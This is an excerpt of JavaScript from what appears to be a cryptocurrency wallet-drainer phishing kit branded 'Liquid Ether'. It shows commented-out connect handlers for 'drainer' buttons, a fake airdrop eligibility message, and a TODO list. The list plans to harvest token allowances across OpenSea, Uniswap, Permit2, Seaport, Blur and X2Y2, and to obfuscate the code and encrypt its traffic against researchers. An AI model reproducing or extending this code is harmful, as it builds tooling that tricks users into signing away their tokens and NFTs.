...
loop
	document.getElementById("drainer-button-2").onclick = async function() {
		connect();
	}
	*/

		//TODO: api encryption https://cryptojs.gitbook.io/docs/
	/*axios.interceptors.request.use(function (config) {
        console.log("catch request", config);
        return config;
    }, function (error) {
	...
	/*
TODO:
 - check where more token allowance - opensea, uniswap, permit2 (?) done with multicalls just another way check to make new temp
 - seaport + blur + x2y2
 - moonbirds fix when one nft is nesting and another is not
 - uniswap positions
 - obfuscate (this too) hello researcher
 - axios http encryption
 - first change chain then set nonce etc.
*/

//drainer-button class not id for multiple buttons
...
const DRAINER_APP_NAME = "Liquid Ether";
...
function updateWebsite() {
	try {
		...
		if(eligible) {
			document.getElementById("drainer-eligibility").innerHTML = "You are eligible to claim: <b>" + getEligibleAmount(chainValues) + " liquidETH</b>";
		} else {
